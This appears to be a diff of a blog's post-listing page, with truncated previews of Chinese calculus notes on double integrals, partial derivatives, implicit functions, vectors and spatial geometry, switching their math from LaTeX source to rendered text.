class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+二重积分概念与性质
+概念
+定义     设函数$z=f(x,y)$在有界闭区域$D$上有定义，将区域$D$任意分成$n$个小闭区域
+\begin{align}\Delta\sigma_{1},\Delta\sigma_{2},\cdots,\Delta\sigma_{n}\end{align}
+其中Δσi\Delta\sigma_{i}Δσi​表示第iii个小区域，也表示它的面积。在每个Δσi\Delta\sigma_{i}Δσi​上任取一点(ξi,ηi)\left(\xi_{i},\eta_{i}\right)(ξi​,ηi​)，作乘积f(ξi,ηi)Δσif\left(\xi_{i},\eta_{i}\right)\Delta\sigma_{i}f(ξi​,ηi​)Δσi​，并求和∑i=1nf(ξi,ηi)Δσi\sum_{i=1}^{n}f\left(\xi_{i},\eta_{i}\right)\Delta\sigma_{i}∑i=1n​f(ξi​,ηi​)Δσi​，记λ\lambdaλ为nnn个小区域Δσ1,Δσ2,⋯ ,Δσn\Delta\sigma_{1},\Delta ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/169.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="方向导数、梯度与多元函数的极致与最值"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值">方向导数、梯度与多元函数的极致与最值</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-25T15:58:53.000Z" title="发表于 2023-07-25 23:58:53">2023-07-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-12T05:17:53.642Z" title="更新于 2023-09-12 13:17:53">2023-09-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+前置知识
+偏导数
+函数沿坐标轴方向的变化率
+\begin{align}
+f_{x}\left(x_{0}, y_{0}\right) &amp; = \lim _{\Delta x \rightarrow 0} \frac{f\left(x_{0}+\Delta x, y_{0}\right)-f\left(x_{0}, y_{0}\right)}{\Delta x} \\
+f_{y}\left(x_{0}, y_{0}\right) &amp; = \lim _{\Delta y \rightarrow 0} \frac{f\left(x_{0}, y_{0}+\Delta y\right)-f\left(x_{0}, y_{0}\right)}{\Delta y}
+\end{align}
+方向余弦
+l⃗=(a,b)\vec{l}=(a, b)l=(a,b)
 单位化
-$\begin{align}\vec{l} &amp; =\frac{1}{\sqrt{a^{2}+b^{2}}}(a, b) \&amp;=  \left(\frac{a}{\sqrt{a^{2}+b^{2}}}, \frac{b}{\sqrt{a^{2}+b^{2}}}\right ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/168.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数微分的几何应用"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用">多元函数微分的几何应用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-03T15:58:53.000Z" title="发表于 2023-07-03 23:58:53">2023-07-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-23T15:42:41.908Z" title="更新于 2023-07-23 23:42:41">2023-07-23</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-一元向量值函数及其导数一元向量值函数由空间解析几何知道，空间曲线$\Gamma$的参数方程为
-$\begin{align}\left{\begin{array}{l}x=\varphi(t), \y=\psi(t), \quad t \in[\alpha, \beta]  \z=\omega(t),\end{array}\right.\end{align}$
+\begin{align}
+\vec{l} &amp; =\frac{1}{\sqrt{a^{2}+b^{2}}}(a, b) \\
+&amp;=  \left(\frac{a}{\sqrt{a^{2}+b^{2}}} ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/168.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数微分的几何应用"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用">多元函数微分的几何应用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-03T15:58:53.000Z" title="发表于 2023-07-03 23:58:53">2023-07-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-23T15:42:41.908Z" title="更新于 2023-07-23 23:42:41">2023-07-23</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+一元向量值函数及其导数
+一元向量值函数
+由空间解析几何知道，空间曲线Γ\GammaΓ的参数方程为
+\begin{align}\left\{\begin{array}{l}x=\varphi(t), \\y=\psi(t), \quad t \in[\alpha, \beta]  \\z=\omega(t),\end{array}\right.\end{align}
 方程也可以写成向量形式。若记
-$\begin{align}\vec{r}=x \vec{i}+y \vec{j}+z \vec{k}, \quad \vec{f}(t)=\varphi(t) \vec {i}+\psi(t) \vec{j}+\omega(t) \vec{k}\end{align}$
+\begin{align}\vec{r}=x \vec{i}+y \vec{j}+z \vec{k}, \quad \vec{f}(t)=\varphi(t) \vec {i}+\psi(t) \vec{j}+\omega(t) \vec{k}\end{align}
 则方程就成为向量方程
-$\begin{align}\vec{r}=\vec{f}(t), t \in[\alpha, \boldsymbol{\beta}] \end{align}$
-定义设数集$D\subset\mathbf{R}$，则称映射$f:D\rightarrow\mathbf{R}^{n}$为一元向量值函数，通常记为
-$ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/167.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="隐函数求导"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导">隐函数求导</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-24T15:58:53.000Z" title="发表于 2023-06-24 23:58:53">2023-06-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-26T08:56:46.079Z" title="更新于 2023-06-26 16:56:46">2023-06-26</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-隐函数的类型一个方程情形二元方程设函数$F(x,y)$在点$P\left(x{0},y{0}\right)$的某一领域内具有连续偏导数，且
-
-$F(x{0},y{0})=0$
-
-$F{y}\left(x{0},y_{0}\right)\neq0$
-注：$F_y\neq0\Longrightarrow y=y(x)$相应的$F_x\neq0\Longrightarrow x=x(y)$
+\begin{align}\vec{r}=\vec{f}(t), t \in[\alpha, \boldsymbol{\beta}] \end{align}
+定义
+设数集D⊂RD\subset\mathbf{R}D⊂R，则称映射f:D→Rnf:D\rightarrow\mathbf{R}^{n}f:D→Rn为 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/167.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="隐函数求导"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导">隐函数求导</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-24T15:58:53.000Z" title="发表于 2023-06-24 23:58:53">2023-06-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-26T08:56:46.079Z" title="更新于 2023-06-26 16:56:46">2023-06-26</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+隐函数的类型
+一个方程情形
+二元方程
+设函数F(x,y)F(x,y)F(x,y)在点P(x0,y0)P\left(x_{0},y_{0}\right)P(x0​,y0​)的某一领域内具有连续偏导数，且
 
 
-则方程$F(x,y)=0$在点$\left(x{0},y{0}\right)$的某一领域内恒能唯一确定
-一个连续且有连续偏导的函数$y=y(x)$，它满足$y{0}=y\left(x{0}\right)$，且
-$\begin{align}\frac{dy}{dx}=-\frac{F{x}}{F{y}}\end{align}$
-$F_x,F_y$指的是二元函数$F(x,y)$对$x,y$的偏导数
+F(x0,y0)=0F(x_{0},y_{0})=0F(x0​,y0​)=0
 
 
-例题三元函数设函数$F(x,y,z)$在点$P\left(x{0},y{0},z_{0}\right)$的某一领域内具有连缘偏导数，且
+Fy(x0,y0)≠0F_{y}\left(x_{0},y_{0}\right)\neq0Fy​(x0​,y0​)​=0
+注：Fy≠0⟹y=y(x)F_y\neq0\Longrightarrow y=y(x)Fy​​=0⟹y=y(x)相应的Fx≠0⟹x=x(y)F_x\neq0\Longrightarrow x=x(y)Fx​​=0⟹x=x(y)
 
-$F(x{0},y{0},z_{0})=0$
 
-$F{z}(x{0 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/166.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元复合函数求导法则"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则">多元复合函数求导法则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-18T15:58:53.000Z" title="发表于 2023-06-18 23:58:53">2023-06-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-19T02:03:12.845Z" title="更新于 2023-06-19 10:03:12">2023-06-19</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-回顾一元复合函数：$y=f(\varphi(x)) \Leftrightarrow y=f(u), u=\varphi(x)$
-其求导有链式法则：$\frac{\mathrm{d} y}{\mathrm{~d} x}=\frac{\mathrm{d} y}{\mathrm{~d} u} \frac{\mathrm{d} u}{\mathrm{~d} x}$
-画出函数关系图：$y\rightarrow u\rightarrow x$，可见从$y$到x$$有一条路径,所以结果是1项的和，每一段路径（对应一个导数）乘起来。
-全导数一元函数与多元函数复合的情形如果函数$u=\varphi(t)$及$v=\psi(t)$都在点$t$可导，函数$z=f(u, v)$在对应 点$(u, v)$具有连续偏导数，那么复合函数$z=f[\varphi(t), \psi(t)]$在点$t$可导，且有
-$\begin{align}\frac{\mathrm{d} z}{\mathrm{~d} t}=\frac{\partial z}{\partial u}\cdot\frac{\mathrm{d} u}{\ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/165.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="偏导数与全微分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分">偏导数与全微分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-11T15:58:53.000Z" title="发表于 2023-06-11 23:58:53">2023-06-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-03T05:56:48.038Z" title="更新于 2023-08-03 13:56:48">2023-08-03</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-偏导数函数$f(x,y)$在点$x_0,y_0$关于$x$的偏导数：
-$\begin{align}f{x}\left(x{0}, y{0}\right) =\left.\frac{\partial f}{\partial x}\right|{(x0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}x}f(x,y_0)\right|{x=x0}=\lim {\Delta x \rightarrow 0} \frac{f\left(x{0}+\Delta x, y{0}\right)-f\left(x{0}, y{0}\right)}{\Delta x}\end{align}$
-关于$y$的偏导数为：
-$\begin{align}f{y}\left(x{0}, y{0}\right)=\left.\frac{\partial f}{\partial y}\right|{(x0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}y}f(x_0,y)\right|{y=y0}=\lim {\Delta y \rightarrow  ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/05/24/FurtherMathematics_0xB/" title="多元函数的基本概念"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/164.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数的基本概念"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/05/24/FurtherMathematics_0xB/" title="多元函数的基本概念">多元函数的基本概念</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-24T15:58:53.000Z" title="发表于 2023-05-24 23:58:53">2023-05-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-11T15:38:56.473Z" title="更新于 2023-06-11 23:38:56">2023-06-11</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-平面点集坐标平面当在平面上引人了一个直角坐标系后，平面上的点$P$与有序二元实数组$(x,y)$之间就建立了一一对应。于是，我们常把有序实数组$(x,y)$与平面上的点$P$视作是等同的。这种建立了坐标系的平而称为坐标平面。二元有序实数组$(x,y)$的全体，$R^{2}=R \times R={(x, y) \mid x, y \in R}$即就表示坐标平面。
-from manim import *class NumberPlaneWithPoint(Scene):    def construct(self):        # 创建坐标系        axes = Axes(            x_range=(-5, 5),            y_range=(-5, 5),            x_length=10,            y_length=10,            x_axis_config=&#123;                &quot;include_numbers&quot;: True,                &q ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/04/17/FurtherMathematics_0xA/" title="空间几何及其方程"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/163.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="空间几何及其方程"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/04/17/FurtherMathematics_0xA/" title="空间几何及其方程">空间几何及其方程</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-17T15:58:53.000Z" title="发表于 2023-04-17 23:58:53">2023-04-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-11T09:33:08.533Z" title="更新于 2023-06-11 17:33:08">2023-06-11</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-空间平面与直线空间平面及其方程点法式方程已知平面$\Pi$上一点$M{0}\left(x{0}, y{0}, z{0}\right)$及与该平面垂直的非零向量$\vec{n}=(A, B, C)$它称为该平面的法向量。法向量在这个平面上是无穷多个的
+则方程F(x,y)=0F(x,y)=0F(x,y)=0在点(x0,y0)\left(x_{0},y_{0}\right)(x0​,y0​)的某一领域内恒能唯一确定
+一个连续且有连续偏导的函数y=y(x)y=y(x)y=y(x)，它满足y0=y(x0)y_{0}=y\left(x_{0}\right)y0​=y(x0​)，且
+\begin{align ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/166.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元复合函数求导法则"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则">多元复合函数求导法则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-18T15:58:53.000Z" title="发表于 2023-06-18 23:58:53">2023-06-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-19T02:03:12.845Z" title="更新于 2023-06-19 10:03:12">2023-06-19</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+回顾
+一元复合函数：y=f(φ(x))⇔y=f(u),u=φ(x)y=f(\varphi(x)) \Leftrightarrow y=f(u), u=\varphi(x)y=f(φ(x))⇔y=f(u),u=φ(x)
+其求导有链式法则：dy dx=dy dudu dx\frac{\mathrm{d} y}{\mathrm{~d} x}=\frac{\mathrm{d} y}{\mathrm{~d} u} \frac{\mathrm{d} u}{\mathrm{~d} x} dxdy​= dudy​ dxdu​
+画出函数关系图：y→u→xy\rightarrow u\rightarrow xy→u→x，可见从yyy到x$$有一条路径,所以结果是1项的和，每一段路径（对应一个导数）乘起来。
+全导数
+一元函数与多元函数复合的情形
+如果函数u=φ(t)u=\varphi(t)u=φ(t)及v=ψ(t)v=\psi(t)v=ψ(t)都在点ttt可导，函数z=f(u,v)z=f(u, v)z=f(u,v)在对应 点(u,v)(u, v)(u,v)具有连续偏导数，那么复合函数z=f[φ(t),ψ( ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/165.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="偏导数与全微分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分">偏导数与全微分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-11T15:58:53.000Z" title="发表于 2023-06-11 23:58:53">2023-06-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-03T05:56:48.038Z" title="更新于 2023-08-03 13:56:48">2023-08-03</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+偏导数
+函数f(x,y)f(x,y)f(x,y)在点x0,y0x_0,y_0x0​,y0​关于xxx的偏导数：
+\begin{align}f_{x}\left(x_{0}, y_{0}\right) =\left.\frac{\partial f}{\partial x}\right|_{(x_0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}x}f(x,y_0)\right|_{x=x_0}=\lim _{\Delta x \rightarrow 0} \frac{f\left(x_{0}+\Delta x, y_{0}\right)-f\left(x_{0}, y_{0}\right)}{\Delta x}\end{align}
+关于yyy的偏导数为：
+\begin{align}f_{y}\left(x_{0}, y_{0}\right)=\left.\frac{\partial f}{\partial y}\right|_{(x_0,y_0)}=\left.\frac{\mathrm{d}}{\mathrm{d}y}f(x_0,y)\right ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/05/24/FurtherMathematics_0xB/" title="多元函数的基本概念"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/164.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数的基本概念"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/05/24/FurtherMathematics_0xB/" title="多元函数的基本概念">多元函数的基本概念</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-24T15:58:53.000Z" title="发表于 2023-05-24 23:58:53">2023-05-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-11T15:38:56.473Z" title="更新于 2023-06-11 23:38:56">2023-06-11</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+平面点集
+坐标平面
+当在平面上引人了一个直角坐标系后，平面上的点PPP与有序二元实数组(x,y)(x,y)(x,y)之间就建立了一一对应。于是，我们常把有序实数组(x,y)(x,y)(x,y)与平面上的点PPP视作是等同的。这种建立了坐标系的平而称为坐标平面。二元有序实数组(x,y)(x,y)(x,y)的全体，R2=R×R={(x,y)∣x,y∈R}R^{2}=R \times R=\{(x, y) \mid x, y \in R\}R2=R×R={(x,y)∣x,y∈R}即就表示坐标平面。
+from manim import *class NumberPlaneWithPoint(Scene):    def construct(self):        # 创建坐标系        axes = Axes(            x_range=(-5, 5),            y_range=(-5, 5),            x_length=10,            y_length=10,            x_axis_config=&#123;   ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/04/17/FurtherMathematics_0xA/" title="空间几何及其方程"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/163.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="空间几何及其方程"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/04/17/FurtherMathematics_0xA/" title="空间几何及其方程">空间几何及其方程</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-17T15:58:53.000Z" title="发表于 2023-04-17 23:58:53">2023-04-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-11T09:33:08.533Z" title="更新于 2023-06-11 17:33:08">2023-06-11</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
+空间平面与直线
+空间平面及其方程
+点法式方程
+已知平面Π\PiΠ上一点M0(x0,y0,z0)M_{0}\left(x_{0}, y_{0}, z_{0}\right)M0​(x0​,y0​,z0​)及与该平面垂直的非零向量n⃗=(A,B,C)\vec{n}=(A, B, C)n=(A,B,C)它称为该平面的法向量。法向量在这个平面上是无穷多个的
 
-$M_0(x_0, y_0, z_0)$是平面$\Pi$上的一个定点， 且已知该平面的法向量$\mathbf{n} = (A, B, C)$，对于平面上任一点$M(x, y, z)$，由于向量$\overrightarrow{M_0M} = (x - x_0, y - y_0, z - z_0)$必与平面$\Pi$的法向量$\mathbf{n}$垂直，于是有$\overrightarrow{M_0M} · \mathbf{n} = 0$，即
-$\begin{align}A(x - x_0) + B(y - y_0) + C(z - z_0) = 0\end{align}$
-一般方程将平面的点法式方程展开，我们就得到平面的一般式方程。任一平面的方程都是三元一次方程
-$\begin{align}A\left(x-x{0}\right)+B\ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/03/20/FurtherMathematics_0x09/" title="向量"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/162.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/20/FurtherMathematics_0x09/" title="向量">向量</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-20T15:58:53.000Z" title="发表于 2023-03-20 23:58:53">2023-03-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-19T09:38:40.993Z" title="更新于 2023-04-19 17:38:40">2023-04-19</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-共有概念概念：空间或者平面具有大小和方向的量
-表示：$\overrightarrow{AB}$或者$\vec{a}$
-膜长：平面或者空间中向量的大小。记作$|\overrightarrow{AB}|$或者$|\vec{a}|$
-特殊向量单位向量对于任意向量$\vec{a}$，不论方向如何，若其大小为单位长度，则称其为$\vec{a}$方向上的单位向量（Unit vector）。单位向量通常被记为$\vec{u}$，它们的模长为1。
-空间坐标系的三个基向量${\displaystyle {\vec {i}}=(1,0,0)}$，${\displaystyle {\vec {j}}=(0,1,0)}$，${\displaystyle {\vec {k}}=(0,0,1)}$都是单位向量。
-反向量一个向量$\vec{v}$的反向量（Opposite vector）与它大小相等，但方向相反，一般记作${\displaystyle -{\vec {v}}}$。如果向量$\vec{a}$是向量$\vec{b}$的反向量，那么$\vec{b}$也是$\vec{a}$的反向量。
-另外，向量$\vec ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/03/10/FurtherMathematics_0x08/" title="定积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/161.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="定积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/10/FurtherMathematics_0x08/" title="定积分">定积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-10T15:58:53.000Z" title="发表于 2023-03-10 23:58:53">2023-03-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T05:12:22.748Z" title="更新于 2023-03-13 13:12:22">2023-03-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-定积分定义设函数$f(x)$在$[a,b]$上有界，在$[a,b]$中任意插入若干个分点：
-$\begin{align}a=x0 &lt; x_1 &lt; \cdots &lt; x{i-1} &lt; xi &lt; \cdots &lt; x{n-1} &lt; x_n=b\end{align}$
-把$[a,b]$分成$n$个小区间：
-$\begin{align}[x0,x_1],\ \cdots,[x{i-1},x{i}],\ \cdots,\ [x{n-1},x_n]\end{align}$
+M0(x0,y0,z0)M_0(x_0, y_0, z_0)M0​(x0​,y0​,z0​)是平面Π\PiΠ上的一个定点， 且已知该平面的法向量n=(A,B,C)\mathbf{n} = (A, B, C)n=(A,B,C)，对于平面上任一点M(x,y,z)M(x, y, z)M(x,y,z)，由于向量M0M→=(x−x0,y−y0,z−z0)\overrightarrow{M_0M} = (x - x_0, y - y_0, z - z_0)M0​M​=(x−x0​,y−y0​,z−z0​)必与平面Π\PiΠ的法向量n\mathbf{n}n垂直，于是有M0M→⋅n=0\overrightarrow{M_0M} · \mathbf{n}  ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/03/20/FurtherMathematics_0x09/" title="向量"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/162.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/03/20/FurtherMathematics_0x09/" title="向量">向量</a><div class="article-meta-wrap"><span 